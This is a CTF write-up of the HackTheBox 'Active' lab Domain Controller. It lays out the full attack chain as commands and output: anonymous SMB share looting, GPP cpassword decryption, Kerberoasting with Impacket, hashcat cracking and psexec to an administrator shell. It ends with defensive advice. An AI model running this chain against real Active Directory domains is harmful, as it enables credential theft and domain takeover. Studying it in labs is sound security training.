---
toc: true
comments: true
title: HackTheBox - Active
layout: post
title: HackTheBox - Active
date: 2024-07-22 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Windows, Active Directory, SMB, GPP, cpassword, Kerberoasting, Impacket, PrivEsc]    
image: /assets/Posts/Active/logo.png
---

## Pre
- Active is the perfect companion to [Forest](/posts/hackthebox-forest/): it's another AD box, but it teaches two *different* techniques – **GPP cpassword** recovery and **Kerberoasting** – so together the pair covers most of the "easy AD" playbook.
- No exploits or crashes here, just understanding how domain features leak credentials when they're misconfigured.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
```

Another Domain Controller (domain `active.htb`). Add it to `/etc/hosts`.

## Phase 2: SMB null session → Groups.xml
We check for anonymous SMB shares:

```shell
$ smbclient -L //10.10.10.100/ -N
	Sharename       Type      Comment
	---------       ----      -------
	Replication     Disk
	SYSVOL          Disk      Logon server share
	Users           Disk
```

`Replication` is readable with a null session – and it's a copy of `SYSVOL`, the domain-wide policy share. We pull it recursively:

```shell
$ smbclient //10.10.10.100/Replication -N -c 'recurse ON; prompt OFF; mget *'
```

Buried in the Group Policy Preferences we find the smoking gun:

```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

## Phase 3: Cracking the GPP cpassword
Old Group Policy Preferences let admins set local account passwords, stored in `Groups.xml` in a `cpassword` attribute – "encrypted" with **an AES key that Microsoft publicly published** (MS14-025). In other words, it's reversible by anyone.

```xml
<Groups ...>
  <User name="active.htb\SVC_TGS" ...>
    <Properties ... cpassword="edBSHOwhZLTjt/QS9Fe...(snip)" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

Decrypt it with `gpp-decrypt`:

```shell
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

We now have domain creds: `SVC_TGS : GPPstillStandingStrong2k18`. They give us read access to the `Users` share and the user flag.

> GPP cpassword (MS14-025) is one of the highest-value findings in a real AD engagement. Microsoft patched the *creation* of new GPP passwords in 2014, but old `Groups.xml` files linger in SYSVOL for years. Always grep SYSVOL for `cpassword`.
{: .prompt-tip }

## Phase 4: Kerberoasting → Administrator
With any valid domain account we can now **Kerberoast**. Any user can request a service ticket (TGS) for any account that has a Service Principal Name (SPN). That ticket is encrypted with the *service account's* password hash – so if a high-privilege account runs a service, we can request its ticket and crack it offline.

Impacket's `GetUserSPNs.py` finds SPN-enabled accounts and requests their tickets in one go:

```shell
$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
ServicePrincipalName  Name           MemberOf
--------------------  -------------  -----------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS...<snip>
```

The **Administrator** account itself has an SPN – jackpot. Crack the TGS with hashcat mode **13100**:

```shell
$ hashcat -m 13100 admin_tgs.hash /usr/share/wordlists/rockyou.txt
$krb5tgs$23$...:Ticketmaster1968
```

Password: `Ticketmaster1968`. Straight to a SYSTEM shell:

```shell
$ psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
C:\> whoami
active\administrator
```

## Conclusions
- Active pairs beautifully with Forest: where Forest was AS-REP Roasting + ACL abuse + DCSync, Active is GPP cpassword + Kerberoasting. Between the two you've seen the core of easy-AD.
- The theme is **legacy features that leak secrets**: a decade-old `Groups.xml` and a service account with an SPN and a weak password.
- Defensive notes: purge GPP passwords from SYSVOL, use strong/managed service-account passwords (gMSA), and monitor for unusual volumes of TGS requests (Kerberoasting).
- Next, a THM take on Active Directory with different tooling on [Attacktive Directory](/posts/tryhackme-attacktive-directory/).

_Keep hacking_  🙈🙉🙊
